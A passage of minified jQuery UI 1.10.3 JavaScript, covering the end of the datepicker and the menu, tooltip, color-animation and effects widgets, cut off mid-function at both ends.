return isNaN(e)?d:e},f=p(u[0]),m=Math.max(f,p(u[1]||"")),f=s?Math.max(f,s.getFullYear()):f,m=n?Math.min(m,n.getFullYear()):m,t.yearshtml+="<select class='ui-datepicker-year' data-handler='selectYear' data-event='change'>";m>=f;f++)t.yearshtml+="<option value='"+f+"'"+(f===i?" selected='selected'":"")+">"+f+"</option>";t.yearshtml+="</select>",b+=t.yearshtml,t.yearshtml=null}return b+=this._get(t,"yearSuffix"),_&&(b+=(!a&&g&&v?"":"&#xa0;")+y),b+="</div>"},_adjustInstDate:function(t,e,i){var s=t.drawYear+("Y"===i?e:0),n=t.drawMonth+("M"===i?e:0),a=Math.min(t.selectedDay,this._getDaysInMonth(s,n))+("D"===i?e:0),r=this._restrictMinMax(t,this._daylightSavingAdjust(new Date(s,n,a)));t.selectedDay=r.getDate(),t.drawMonth=t.selectedMonth=r.getMonth(),t.drawYear=t.selectedYear=r.getFullYear(),("M"===i||"Y"===i)&&this._notifyChange(t)},_restrictMinMax:function(t,e){var i=this._getMinMaxDate(t,"min"),s=this._getMinMaxDate(t,"max"),n=i&&i>e?i:e;return s&&n>s?s:n},_notifyChange:function(t){var e=this._get(t,"onChangeMonthYear");e&&e.apply(t.input?t.input[0]:null,[t.selectedYear,t.selectedMonth+1,t])},_getNumberOfMonths:function(t){var e=this._get(t,"numberOfMonths");return null==e?[1,1]:"number"==typeof e?[1,e]:e},_getMinMaxDate:function(t,e){return this._determineDate(t,this._get(t,e+"Date"),null)},_getDaysInMonth:function(t,e){return 32-this._daylightSavingAdjust(new Date(t,e,32)).getDate()},_getFirstDayOfMonth:function(t,e){return new Date(t,e,1).getDay()},_canAdjustMonth:function(t,e,i,s){var n=this._getNumberOfMonths(t),a=this._daylightSavingAdjust(new Date(i,s+(0>e?e:n[0]*n[1]),1));return 0>e&&a.setDate(this._getDaysInMonth(a.getFullYear(),a.getMonth())),this._isInRange(t,a)},_isInRange:function(t,e){var i,s,n=this._getMinMaxDate(t,"min"),a=this._getMinMaxDate(t,"max"),r=null,o=null,h=this._get(t,"yearRange");return h&&(i=h.split(":"),s=(new Date).getFullYear(),r=parseInt(i[0],10),o=parseInt(i[1],10),i[0].match(/[+\-].*/)&&(r+=s),i[1].match(/[+\-].*/)&&(o+=s)),(!n||e.getTime()>=n.getTime())&&(!a||e.getTime()<=a.getTime())&&(!r||e.getFullYear()>=r)&&(!o||o>=e.getFullYear())},_getFormatConfig:function(t){var e=this._get(t,"shortYearCutoff");return e="string"!=typeof e?e:(new Date).getFullYear()%100+parseInt(e,10),{shortYearCutoff:e,dayNamesShort:this._get(t,"dayNamesShort"),dayNames:this._get(t,"dayNames"),monthNamesShort:this._get(t,"monthNamesShort"),monthNames:this._get(t,"monthNames")}},_formatDate:function(t,e,i,s){e||(t.currentDay=t.selectedDay,t.currentMonth=t.selectedMonth,t.currentYear=t.selectedYear);var n=e?"object"==typeof e?e:this._daylightSavingAdjust(new Date(s,i,e)):this._daylightSavingAdjust(new Date(t.currentYear,t.currentMonth,t.currentDay));return this.formatDate(this._get(t,"dateFormat"),n,this._getFormatConfig(t))}}),t.fn.datepicker=function(e){if(!this.length)return this;t.datepicker.initialized||(t(document).mousedown(t.datepicker._checkExternalClick),t.datepicker.initialized=!0),0===t("#"+t.datepicker._mainDivId).length&&t("body").append(t.datepicker.dpDiv);var i=Array.prototype.slice.call(arguments,1);return"string"!=typeof e||"isDisabled"!==e&&"getDate"!==e&&"widget"!==e?"option"===e&&2===arguments.length&&"string"==typeof arguments[1]?t.datepicker["_"+e+"Datepicker"].apply(t.datepicker,[this[0]].concat(i)):this.each(function(){"string"==typeof e?t.datepicker["_"+e+"Datepicker"].apply(t.datepicker,[this].concat(i)):t.datepicker._attachDatepicker(this,e)}):t.datepicker["_"+e+"Datepicker"].apply(t.datepicker,[this[0]].concat(i))},t.datepicker=new i,t.datepicker.initialized=!1,t.datepicker.uuid=(new Date).getTime(),t.datepicker.version="1.10.3"})(jQuery);(function(t){t.widget("ui.menu",{version:"1.10.3",defaultElement:"<ul>",delay:300,options:{icons:{submenu:"ui-icon-carat-1-e"},menus:"ul",position:{my:"left top",at:"right top"},role:"menu",blur:null,focus:null,select:null},_create:function(){this.activeMenu=this.element,this.mouseHandled=!1,this.element.uniqueId().addClass("ui-menu ui-widget ui-widget-content ui-corner-all").toggleClass("ui-menu-icons",!!this.element.find(".ui-icon").length).attr({role:this.options.role,tabIndex:0}).bind("click"+this.eventNamespace,t.proxy(function(t){this.options.disabled&&t.preventDefault()},this)),this.options.disabled&&this.element.addClass("ui-state-disabled").attr("aria-disabled","true"),this._on({"mousedown .ui-menu-item > a":function(t){t.preventDefault()},"click .ui-state-disabled > a":function(t){t.preventDefault()},"click .ui-menu-item:has(a)":function(e){var i=t(e.target).closest(".ui-menu-item");!this.mouseHandled&&i.not(".ui-state-disabled").length&&(this.mouseHandled=!0,this.select(e),i.has(".ui-menu").length?this.expand(e):this.element.is(":focus")||(this.element.trigger("focus",[!0]),this.active&&1===this.active.parents(".ui-menu").length&&clearTimeout(this.timer)))},"mouseenter .ui-menu-item":function(e){var i=t(e.currentTarget);i.siblings().children(".ui-state-active").removeClass("ui-state-active"),this.focus(e,i)},mouseleave:"collapseAll","mouseleave .ui-menu":"collapseAll",focus:function(t,e){var i=this.active||this.element.children(".ui-menu-item").eq(0);e||this.focus(t,i)},blur:function(e){this._delay(function(){t.contains(this.element[0],this.document[0].activeElement)||this.collapseAll(e)})},keydown:"_keydown"}),this.refresh(),this._on(this.document,{click:function(e){t(e.target).closest(".ui-menu").length||this.collapseAll(e),this.mouseHandled=!1}})},_destroy:function(){this.element.removeAttr("aria-activedescendant").find(".ui-menu").addBack().removeClass("ui-menu ui-widget ui-widget-content ui-corner-all ui-menu-icons").removeAttr("role").removeAttr("tabIndex").removeAttr("aria-labelledby").removeAttr("aria-expanded").removeAttr("aria-hidden").removeAttr("aria-disabled").removeUniqueId().show(),this.element.find(".ui-menu-item").removeClass("ui-menu-item").removeAttr("role").removeAttr("aria-disabled").children("a").removeUniqueId().removeClass("ui-corner-all ui-state-hover").removeAttr("tabIndex").removeAttr("role").removeAttr("aria-haspopup").children().each(function(){var e=t(this);e.data("ui-menu-submenu-carat")&&e.remove()}),this.element.find(".ui-menu-divider").removeClass("ui-menu-divider ui-widget-content")},_keydown:function(e){function i(t){return t.replace(/[\-\[\]{}()*+?.,\\\^$|#\s]/g,"\\$&")}var s,n,a,o,r,h=!0;switch(e.keyCode){case t.ui.keyCode.PAGE_UP:this.previousPage(e);break;case t.ui.keyCode.PAGE_DOWN:this.nextPage(e);break;case t.ui.keyCode.HOME:this._move("first","first",e);break;case t.ui.keyCode.END:this._move("last","last",e);break;case t.ui.keyCode.UP:this.previous(e);break;case t.ui.keyCode.DOWN:this.next(e);break;case t.ui.keyCode.LEFT:this.collapse(e);break;case t.ui.keyCode.RIGHT:this.active&&!this.active.is(".ui-state-disabled")&&this.expand(e);break;case t.ui.keyCode.ENTER:case t.ui.keyCode.SPACE:this._activate(e);break;case t.ui.keyCode.ESCAPE:this.collapse(e);break;default:h=!1,n=this.previousFilter||"",a=String.fromCharCode(e.keyCode),o=!1,clearTimeout(this.filterTimer),a===n?o=!0:a=n+a,r=RegExp("^"+i(a),"i"),s=this.activeMenu.children(".ui-menu-item").filter(function(){return r.test(t(this).children("a").text())}),s=o&&-1!==s.index(this.active.next())?this.active.nextAll(".ui-menu-item"):s,s.length||(a=String.fromCharCode(e.keyCode),r=RegExp("^"+i(a),"i"),s=this.activeMenu.children(".ui-menu-item").filter(function(){return r.test(t(this).children("a").text())})),s.length?(this.focus(e,s),s.length>1?(this.previousFilter=a,this.filterTimer=this._delay(function(){delete this.previousFilter},1e3)):delete this.previousFilter):delete this.previousFilter}h&&e.preventDefault()},_activate:function(t){this.active.is(".ui-state-disabled")||(this.active.children("a[aria-haspopup='true']").length?this.expand(t):this.select(t))},refresh:function(){var e,i=this.options.icons.submenu,s=this.element.find(this.options.menus);s.filter(":not(.ui-menu)").addClass("ui-menu ui-widget ui-widget-content ui-corner-all").hide().attr({role:this.options.role,"aria-hidden":"true","aria-expanded":"false"}).each(function(){var e=t(this),s=e.prev("a"),n=t("<span>").addClass("ui-menu-icon ui-icon "+i).data("ui-menu-submenu-carat",!0);s.attr("aria-haspopup","true").prepend(n),e.attr("aria-labelledby",s.attr("id"))}),e=s.add(this.element),e.children(":not(.ui-menu-item):has(a)").addClass("ui-menu-item").attr("role","presentation").children("a").uniqueId().addClass("ui-corner-all").attr({tabIndex:-1,role:this._itemRole()}),e.children(":not(.ui-menu-item)").each(function(){var e=t(this);/[^\-\u2014\u2013\s]/.test(e.text())||e.addClass("ui-widget-content ui-menu-divider")}),e.children(".ui-state-disabled").attr("aria-disabled","true"),this.active&&!t.contains(this.element[0],this.active[0])&&this.blur()},_itemRole:function(){return{menu:"menuitem",listbox:"option"}[this.options.role]},_setOption:function(t,e){"icons"===t&&this.element.find(".ui-menu-icon").removeClass(this.options.icons.submenu).addClass(e.submenu),this._super(t,e)},focus:function(t,e){var i,s;this.blur(t,t&&"focus"===t.type),this._scrollIntoView(e),this.active=e.first(),s=this.active.children("a").addClass("ui-state-focus"),this.options.role&&this.element.attr("aria-activedescendant",s.attr("id")),this.active.parent().closest(".ui-menu-item").children("a:first").addClass("ui-state-active"),t&&"keydown"===t.type?this._close():this.timer=this._delay(function(){this._close()},this.delay),i=e.children(".ui-menu"),i.length&&/^mouse/.test(t.type)&&this._startOpening(i),this.activeMenu=e.parent(),this._trigger("focus",t,{item:e})},_scrollIntoView:function(e){var i,s,n,a,o,r;this._hasScroll()&&(i=parseFloat(t.css(this.activeMenu[0],"borderTopWidth"))||0,s=parseFloat(t.css(this.activeMenu[0],"paddingTop"))||0,n=e.offset().top-this.activeMenu.offset().top-i-s,a=this.activeMenu.scrollTop(),o=this.activeMenu.height(),r=e.height(),0>n?this.activeMenu.scrollTop(a+n):n+r>o&&this.activeMenu.scrollTop(a+n-o+r))},blur:function(t,e){e||clearTimeout(this.timer),this.active&&(this.active.children("a").removeClass("ui-state-focus"),this.active=null,this._trigger("blur",t,{item:this.active}))},_startOpening:function(t){clearTimeout(this.timer),"true"===t.attr("aria-hidden")&&(this.timer=this._delay(function(){this._close(),this._open(t)},this.delay))},_open:function(e){var i=t.extend({of:this.active},this.options.position);clearTimeout(this.timer),this.element.find(".ui-menu").not(e.parents(".ui-menu")).hide().attr("aria-hidden","true"),e.show().removeAttr("aria-hidden").attr("aria-expanded","true").position(i)},collapseAll:function(e,i){clearTimeout(this.timer),this.timer=this._delay(function(){var s=i?this.element:t(e&&e.target).closest(this.element.find(".ui-menu"));s.length||(s=this.element),this._close(s),this.blur(e),this.activeMenu=s},this.delay)},_close:function(t){t||(t=this.active?this.active.parent():this.element),t.find(".ui-menu").hide().attr("aria-hidden","true").attr("aria-expanded","false").end().find("a.ui-state-active").removeClass("ui-state-active")},collapse:function(t){var e=this.active&&this.active.parent().closest(".ui-menu-item",this.element);e&&e.length&&(this._close(),this.focus(t,e))},expand:function(t){var e=this.active&&this.active.children(".ui-menu ").children(".ui-menu-item").first();e&&e.length&&(this._open(e.parent()),this._delay(function(){this.focus(t,e)}))},next:function(t){this._move("next","first",t)},previous:function(t){this._move("prev","last",t)},isFirstItem:function(){return this.active&&!this.active.prevAll(".ui-menu-item").length},isLastItem:function(){return this.active&&!this.active.nextAll(".ui-menu-item").length},_move:function(t,e,i){var s;this.active&&(s="first"===t||"last"===t?this.active["first"===t?"prevAll":"nextAll"](".ui-menu-item").eq(-1):this.active[t+"All"](".ui-menu-item").eq(0)),s&&s.length&&this.active||(s=this.activeMenu.children(".ui-menu-item")[e]()),this.focus(i,s)},nextPage:function(e){var i,s,n;return this.active?(this.isLastItem()||(this._hasScroll()?(s=this.active.offset().top,n=this.element.height(),this.active.nextAll(".ui-menu-item").each(function(){return i=t(this),0>i.offset().top-s-n}),this.focus(e,i)):this.focus(e,this.activeMenu.children(".ui-menu-item")[this.active?"last":"first"]())),undefined):(this.next(e),undefined)},previousPage:function(e){var i,s,n;return this.active?(this.isFirstItem()||(this._hasScroll()?(s=this.active.offset().top,n=this.element.height(),this.active.prevAll(".ui-menu-item").each(function(){return i=t(this),i.offset().top-s+n>0}),this.focus(e,i)):this.focus(e,this.activeMenu.children(".ui-menu-item").first())),undefined):(this.next(e),undefined)},_hasScroll:function(){return this.element.outerHeight()<this.element.prop("scrollHeight")},select:function(e){this.active=this.active||t(e.target).closest(".ui-menu-item");var i={item:this.active};this.active.has(".ui-menu").length||this.collapseAll(e,!0),this._trigger("select",e,i)}})})(jQuery);(function(t){function e(e,i){var s=(e.attr("aria-describedby")||"").split(/\s+/);s.push(i),e.data("ui-tooltip-id",i).attr("aria-describedby",t.trim(s.join(" ")))}function i(e){var i=e.data("ui-tooltip-id"),s=(e.attr("aria-describedby")||"").split(/\s+/),n=t.inArray(i,s);-1!==n&&s.splice(n,1),e.removeData("ui-tooltip-id"),s=t.trim(s.join(" ")),s?e.attr("aria-describedby",s):e.removeAttr("aria-describedby")}var s=0;t.widget("ui.tooltip",{version:"1.10.3",options:{content:function(){var e=t(this).attr("title")||"";return t("<a>").text(e).html()},hide:!0,items:"[title]:not([disabled])",position:{my:"left top+15",at:"left bottom",collision:"flipfit flip"},show:!0,tooltipClass:null,track:!1,close:null,open:null},_create:function(){this._on({mouseover:"open",focusin:"open"}),this.tooltips={},this.parents={},this.options.disabled&&this._disable()},_setOption:function(e,i){var s=this;return"disabled"===e?(this[i?"_disable":"_enable"](),this.options[e]=i,void 0):(this._super(e,i),"content"===e&&t.each(this.tooltips,function(t,e){s._updateContent(e)}),void 0)},_disable:function(){var e=this;t.each(this.tooltips,function(i,s){var n=t.Event("blur");n.target=n.currentTarget=s[0],e.close(n,!0)}),this.element.find(this.options.items).addBack().each(function(){var e=t(this);e.is("[title]")&&e.data("ui-tooltip-title",e.attr("title")).attr("title","")})},_enable:function(){this.element.find(this.options.items).addBack().each(function(){var e=t(this);e.data("ui-tooltip-title")&&e.attr("title",e.data("ui-tooltip-title"))})},open:function(e){var i=this,s=t(e?e.target:this.element).closest(this.options.items);s.length&&!s.data("ui-tooltip-id")&&(s.attr("title")&&s.data("ui-tooltip-title",s.attr("title")),s.data("ui-tooltip-open",!0),e&&"mouseover"===e.type&&s.parents().each(function(){var e,s=t(this);s.data("ui-tooltip-open")&&(e=t.Event("blur"),e.target=e.currentTarget=this,i.close(e,!0)),s.attr("title")&&(s.uniqueId(),i.parents[this.id]={element:this,title:s.attr("title")},s.attr("title",""))}),this._updateContent(s,e))},_updateContent:function(t,e){var i,s=this.options.content,n=this,a=e?e.type:null;return"string"==typeof s?this._open(e,t,s):(i=s.call(t[0],function(i){t.data("ui-tooltip-open")&&n._delay(function(){e&&(e.type=a),this._open(e,t,i)})}),i&&this._open(e,t,i),void 0)},_open:function(i,s,n){function a(t){l.of=t,o.is(":hidden")||o.position(l)}var o,r,h,l=t.extend({},this.options.position);if(n){if(o=this._find(s),o.length)return o.find(".ui-tooltip-content").html(n),void 0;s.is("[title]")&&(i&&"mouseover"===i.type?s.attr("title",""):s.removeAttr("title")),o=this._tooltip(s),e(s,o.attr("id")),o.find(".ui-tooltip-content").html(n),this.options.track&&i&&/^mouse/.test(i.type)?(this._on(this.document,{mousemove:a}),a(i)):o.position(t.extend({of:s},this.options.position)),o.hide(),this._show(o,this.options.show),this.options.show&&this.options.show.delay&&(h=this.delayedShow=setInterval(function(){o.is(":visible")&&(a(l.of),clearInterval(h))},t.fx.interval)),this._trigger("open",i,{tooltip:o}),r={keyup:function(e){if(e.keyCode===t.ui.keyCode.ESCAPE){var i=t.Event(e);i.currentTarget=s[0],this.close(i,!0)}},remove:function(){this._removeTooltip(o)}},i&&"mouseover"!==i.type||(r.mouseleave="close"),i&&"focusin"!==i.type||(r.focusout="close"),this._on(!0,s,r)}},close:function(e){var s=this,n=t(e?e.currentTarget:this.element),a=this._find(n);this.closing||(clearInterval(this.delayedShow),n.data("ui-tooltip-title")&&n.attr("title",n.data("ui-tooltip-title")),i(n),a.stop(!0),this._hide(a,this.options.hide,function(){s._removeTooltip(t(this))}),n.removeData("ui-tooltip-open"),this._off(n,"mouseleave focusout keyup"),n[0]!==this.element[0]&&this._off(n,"remove"),this._off(this.document,"mousemove"),e&&"mouseleave"===e.type&&t.each(this.parents,function(e,i){t(i.element).attr("title",i.title),delete s.parents[e]}),this.closing=!0,this._trigger("close",e,{tooltip:a}),this.closing=!1)},_tooltip:function(e){var i="ui-tooltip-"+s++,n=t("<div>").attr({id:i,role:"tooltip"}).addClass("ui-tooltip ui-widget ui-corner-all ui-widget-content "+(this.options.tooltipClass||""));return t("<div>").addClass("ui-tooltip-content").appendTo(n),n.appendTo(this.document[0].body),this.tooltips[i]=e,n},_find:function(e){var i=e.data("ui-tooltip-id");return i?t("#"+i):t()},_removeTooltip:function(t){t.remove(),delete this.tooltips[t.attr("id")]},_destroy:function(){var e=this;t.each(this.tooltips,function(i,s){var n=t.Event("blur");n.target=n.currentTarget=s[0],e.close(n,!0),t("#"+i).remove(),s.data("ui-tooltip-title")&&(s.attr("title",s.data("ui-tooltip-title")),s.removeData("ui-tooltip-title"))})}})})(jQuery);(function(t,e){var i="ui-effects-";t.effects={effect:{}},function(t,e){function i(t,e,i){var s=u[e.type]||{};return null==t?i||!e.def?null:e.def:(t=s.floor?~~t:parseFloat(t),isNaN(t)?e.def:s.mod?(t+s.mod)%s.mod:0>t?0:t>s.max?s.max:t)}function s(i){var s=l(),n=s._rgba=[];return i=i.toLowerCase(),f(h,function(t,a){var o,r=a.re.exec(i),h=r&&a.parse(r),l=a.space||"rgba";return h?(o=s[l](h),s[c[l].cache]=o[c[l].cache],n=s._rgba=o._rgba,!1):e}),n.length?("0,0,0,0"===n.join()&&t.extend(n,a.transparent),s):a[i]}function n(t,e,i){return i=(i+1)%1,1>6*i?t+6*(e-t)*i:1>2*i?e:2>3*i?t+6*(e-t)*(2/3-i):t}var a,o="backgroundColor borderBottomColor borderLeftColor borderRightColor borderTopColor color columnRuleColor outlineColor textDecorationColor textEmphasisColor",r=/^([\-+])=\s*(\d+\.?\d*)/,h=[{re:/rgba?\(\s*(\d{1,3})\s*,\s*(\d{1,3})\s*,\s*(\d{1,3})\s*(?:,\s*(\d?(?:\.\d+)?)\s*)?\)/,parse:function(t){return[t[1],t[2],t[3],t[4]]}},{re:/rgba?\(\s*(\d+(?:\.\d+)?)\%\s*,\s*(\d+(?:\.\d+)?)\%\s*,\s*(\d+(?:\.\d+)?)\%\s*(?:,\s*(\d?(?:\.\d+)?)\s*)?\)/,parse:function(t){return[2.55*t[1],2.55*t[2],2.55*t[3],t[4]]}},{re:/#([a-f0-9]{2})([a-f0-9]{2})([a-f0-9]{2})/,parse:function(t){return[parseInt(t[1],16),parseInt(t[2],16),parseInt(t[3],16)]}},{re:/#([a-f0-9])([a-f0-9])([a-f0-9])/,parse:function(t){return[parseInt(t[1]+t[1],16),parseInt(t[2]+t[2],16),parseInt(t[3]+t[3],16)]}},{re:/hsla?\(\s*(\d+(?:\.\d+)?)\s*,\s*(\d+(?:\.\d+)?)\%\s*,\s*(\d+(?:\.\d+)?)\%\s*(?:,\s*(\d?(?:\.\d+)?)\s*)?\)/,space:"hsla",parse:function(t){return[t[1],t[2]/100,t[3]/100,t[4]]}}],l=t.Color=function(e,i,s,n){return new t.Color.fn.parse(e,i,s,n)},c={rgba:{props:{red:{idx:0,type:"byte"},green:{idx:1,type:"byte"},blue:{idx:2,type:"byte"}}},hsla:{props:{hue:{idx:0,type:"degrees"},saturation:{idx:1,type:"percent"},lightness:{idx:2,type:"percent"}}}},u={"byte":{floor:!0,max:255},percent:{max:1},degrees:{mod:360,floor:!0}},d=l.support={},p=t("<p>")[0],f=t.each;p.style.cssText="background-color:rgba(1,1,1,.5)",d.rgba=p.style.backgroundColor.indexOf("rgba")>-1,f(c,function(t,e){e.cache="_"+t,e.props.alpha={idx:3,type:"percent",def:1}}),l.fn=t.extend(l.prototype,{parse:function(n,o,r,h){if(n===e)return this._rgba=[null,null,null,null],this;(n.jquery||n.nodeType)&&(n=t(n).css(o),o=e);var u=this,d=t.type(n),p=this._rgba=[];return o!==e&&(n=[n,o,r,h],d="array"),"string"===d?this.parse(s(n)||a._default):"array"===d?(f(c.rgba.props,function(t,e){p[e.idx]=i(n[e.idx],e)}),this):"object"===d?(n instanceof l?f(c,function(t,e){n[e.cache]&&(u[e.cache]=n[e.cache].slice())}):f(c,function(e,s){var a=s.cache;f(s.props,function(t,e){if(!u[a]&&s.to){if("alpha"===t||null==n[t])return;u[a]=s.to(u._rgba)}u[a][e.idx]=i(n[t],e,!0)}),u[a]&&0>t.inArray(null,u[a].slice(0,3))&&(u[a][3]=1,s.from&&(u._rgba=s.from(u[a])))}),this):e},is:function(t){var i=l(t),s=!0,n=this;return f(c,function(t,a){var o,r=i[a.cache];return r&&(o=n[a.cache]||a.to&&a.to(n._rgba)||[],f(a.props,function(t,i){return null!=r[i.idx]?s=r[i.idx]===o[i.idx]:e})),s}),s},_space:function(){var t=[],e=this;return f(c,function(i,s){e[s.cache]&&t.push(i)}),t.pop()},transition:function(t,e){var s=l(t),n=s._space(),a=c[n],o=0===this.alpha()?l("transparent"):this,r=o[a.cache]||a.to(o._rgba),h=r.slice();return s=s[a.cache],f(a.props,function(t,n){var a=n.idx,o=r[a],l=s[a],c=u[n.type]||{};null!==l&&(null===o?h[a]=l:(c.mod&&(l-o>c.mod/2?o+=c.mod:o-l>c.mod/2&&(o-=c.mod)),h[a]=i((l-o)*e+o,n)))}),this[n](h)},blend:function(e){if(1===this._rgba[3])return this;var i=this._rgba.slice(),s=i.pop(),n=l(e)._rgba;return l(t.map(i,function(t,e){return(1-s)*n[e]+s*t}))},toRgbaString:function(){var e="rgba(",i=t.map(this._rgba,function(t,e){return null==t?e>2?1:0:t});return 1===i[3]&&(i.pop(),e="rgb("),e+i.join()+")"},toHslaString:function(){var e="hsla(",i=t.map(this.hsla(),function(t,e){return null==t&&(t=e>2?1:0),e&&3>e&&(t=Math.round(100*t)+"%"),t});return 1===i[3]&&(i.pop(),e="hsl("),e+i.join()+")"},toHexString:function(e){var i=this._rgba.slice(),s=i.pop();return e&&i.push(~~(255*s)),"#"+t.map(i,function(t){return t=(t||0).toString(16),1===t.length?"0"+t:t}).join("")},toString:function(){return 0===this._rgba[3]?"transparent":this.toRgbaString()}}),l.fn.parse.prototype=l.fn,c.hsla.to=function(t){if(null==t[0]||null==t[1]||null==t[2])return[null,null,null,t[3]];var e,i,s=t[0]/255,n=t[1]/255,a=t[2]/255,o=t[3],r=Math.max(s,n,a),h=Math.min(s,n,a),l=r-h,c=r+h,u=.5*c;return e=h===r?0:s===r?60*(n-a)/l+360:n===r?60*(a-s)/l+120:60*(s-n)/l+240,i=0===l?0:.5>=u?l/c:l/(2-c),[Math.round(e)%360,i,u,null==o?1:o]},c.hsla.from=function(t){if(null==t[0]||null==t[1]||null==t[2])return[null,null,null,t[3]];var e=t[0]/360,i=t[1],s=t[2],a=t[3],o=.5>=s?s*(1+i):s+i-s*i,r=2*s-o;return[Math.round(255*n(r,o,e+1/3)),Math.round(255*n(r,o,e)),Math.round(255*n(r,o,e-1/3)),a]},f(c,function(s,n){var a=n.props,o=n.cache,h=n.to,c=n.from;l.fn[s]=function(s){if(h&&!this[o]&&(this[o]=h(this._rgba)),s===e)return this[o].slice();var n,r=t.type(s),u="array"===r||"object"===r?s:arguments,d=this[o].slice();return f(a,function(t,e){var s=u["object"===r?t:e.idx];null==s&&(s=d[e.idx]),d[e.idx]=i(s,e)}),c?(n=l(c(d)),n[o]=d,n):l(d)},f(a,function(e,i){l.fn[e]||(l.fn[e]=function(n){var a,o=t.type(n),h="alpha"===e?this._hsla?"hsla":"rgba":s,l=this[h](),c=l[i.idx];return"undefined"===o?c:("function"===o&&(n=n.call(this,c),o=t.type(n)),null==n&&i.empty?this:("string"===o&&(a=r.exec(n),a&&(n=c+parseFloat(a[2])*("+"===a[1]?1:-1))),l[i.idx]=n,this[h](l)))})})}),l.hook=function(e){var i=e.split(" ");f(i,function(e,i){t.cssHooks[i]={set:function(e,n){var a,o,r="";if("transparent"!==n&&("string"!==t.type(n)||(a=s(n)))){if(n=l(a||n),!d.rgba&&1!==n._rgba[3]){for(o="backgroundColor"===i?e.parentNode:e;(""===r||"transparent"===r)&&o&&o.style;)try{r=t.css(o,"backgroundColor"),o=o.parentNode}catch(h){}n=n.blend(r&&"transparent"!==r?r:"_default")}n=n.toRgbaString()}try{e.style[i]=n}catch(h){}}},t.fx.step[i]=function(e){e.colorInit||(e.start=l(e.elem,i),e.end=l(e.end),e.colorInit=!0),t.cssHooks[i].set(e.elem,e.start.transition(e.end,e.pos))}})},l.hook(o),t.cssHooks.borderColor={expand:function(t){var e={};return f(["Top","Right","Bottom","Left"],function(i,s){e["border"+s+"Color"]=t}),e}},a=t.Color.names={aqua:"#00ffff",black:"#000000",blue:"#0000ff",fuchsia:"#ff00ff",gray:"#808080",green:"#008000",lime:"#00ff00",maroon:"#800000",navy:"#000080",olive:"#808000",purple:"#800080",red:"#ff0000",silver:"#c0c0c0",teal:"#008080",white:"#ffffff",yellow:"#ffff00",transparent:[null,null,null,0],_default:"#ffffff"}}(jQuery),function(){function i(e){var i,s,n=e.ownerDocument.defaultView?e.ownerDocument.defaultView.getComputedStyle(e,null):e.currentStyle,a={};if(n&&n.length&&n[0]&&n[n[0]])for(s=n.length;s--;)i=n[s],"string"==typeof n[i]&&(a[t.camelCase(i)]=n[i]);else for(i in n)"string"==typeof n[i]&&(a[i]=n[i]);return a}function s(e,i){var s,n,o={};for(s in i)n=i[s],e[s]!==n&&(a[s]||(t.fx.step[s]||!isNaN(parseFloat(n)))&&(o[s]=n));return o}var n=["add","remove","toggle"],a={border:1,borderBottom:1,borderColor:1,borderLeft:1,borderRight:1,borderTop:1,borderWidth:1,margin:1,padding:1};t.each(["borderLeftStyle","borderRightStyle","borderBottomStyle","borderTopStyle"],function(e,i){t.fx.step[i]=function(t){("none"!==t.end&&!t.setAttr||1===t.pos&&!t.setAttr)&&(jQuery.style(t.elem,i,t.end),t.setAttr=!0)}}),t.fn.addBack||(t.fn.addBack=function(t){return this.add(null==t?this.prevObject:this.prevObject.filter(t))}),t.effects.animateClass=function(e,a,o,r){var h=t.speed(a,o,r);return this.queue(function(){var a,o=t(this),r=o.attr("class")||"",l=h.children?o.find("*").addBack():o;l=l.map(function(){var e=t(this);return{el:e,start:i(this)}}),a=function(){t.each(n,function(t,i){e[i]&&o[i+"Class"](e[i])})},a(),l=l.map(function(){return this.end=i(this.el[0]),this.diff=s(this.start,this.end),this}),o.attr("class",r),l=l.map(function(){var e=this,i=t.Deferred(),s=t.extend({},h,{queue:!1,complete:function(){i.resolve(e)}});return this.el.animate(this.diff,s),i.promise()}),t.when.apply(t,l.get()).done(function(){a(),t.each(arguments,function(){var e=this.el;t.each(this.diff,function(t){e.css(t,"")})}),h.complete.call(o[0])})})},t.fn.extend({addClass:function(e){return function(i,s,n,a){return s?t.effects.animateClass.call(this,{add:i},s,n,a):e.apply(this,arguments)}}(t.fn.addClass),removeClass:function(e){return function(i,s,n,a){return arguments.length>1?t.effects.animateClass.call(this,{remove:i},s,n,a):e.apply(this,arguments)}}(t.fn.removeClass),toggleClass:function(i){return function(s,n,a,o,r){return"boolean"==typeof n||n===e?a?t.effects.animateClass.call(this,n?{add:s}:{remove:s},a,o,r):i.apply(this,arguments):t.effects.animateClass.call(this,{toggle:s},n,a,o)}}(t.fn.toggleClass),switchClass:function(e,i,s,n,a){return t.effects.animateClass.call(this,{add:i,remove:e},s,n,a)}})}(),function(){function s(e,i,s,n){return t.isPlainObject(e)&&(i=e,e=e.effect),e={effect:e},null==i&&(i={}),t.isFunction(i)&&(n=i,s=null,i={}),("number"==typeof i||t.fx.speeds[i])&&(n=s,s=i,i={}),t.isFunction(s)&&(n=s,s=null),i&&t.extend(e,i),s=s||i.duration,e.duration=t.fx.off?0:"number"==typeof s?s:s in t.fx.speeds?t.fx.speeds[s]:t.fx.speeds._default,e.complete=n||i.complete,e}function n(e){return!e||"number"==typeof e||t.fx.speeds[e]?!0:"string"!=typeof e||t.effects.effect[e]?t.isFunction(e)?!0:"object"!=typeof e||e.effect?!1:!0:!0}t.extend(t.effects,{version:"1.10.3",save:function(t,e){for(var s=0;e.length>s;s++)null!==e[s]&&t.data(i+e[s],t[0].style[e[s]])},restore:function(t,s){var n,a;for(a=0;s.length>a;a++)null!==s[a]&&(n=t.data(i+s[a]),n===e&&(n=""),t.css(s[a],n))},setMode:function(t,e){return"toggle"===e&&(e=t.is(":hidden")?"show":"hide"),e},getBaseline:function(t,e){var i,s;switch(t[0]){case"top":i=0;break;case"middle":i=.5;break;case"bottom":i=1;break;default:i=t[0]/e.height}switch(t[1]){case"left":s=0;break;case"center":s=.5;break;case"right":s=1;break;default:s=t[1]/e.width}return{x:s,y:i}},createWrapper:function(e){if(e.parent().is(".ui-effects-wrapper"))return e.parent();var i={width:e.outerWidth(!0),height:e.outerHeight(!0),"float":e.css("float")},s=t("<div></div>").addClass("ui-effects-wrapper").css({fontSize:"100%",background:"transparent",border:"none",margin:0,padding:0}),n={width:e.width(),height:e.height()},a=document.activeElement;try{a.id}catch(o){a=document.body}return 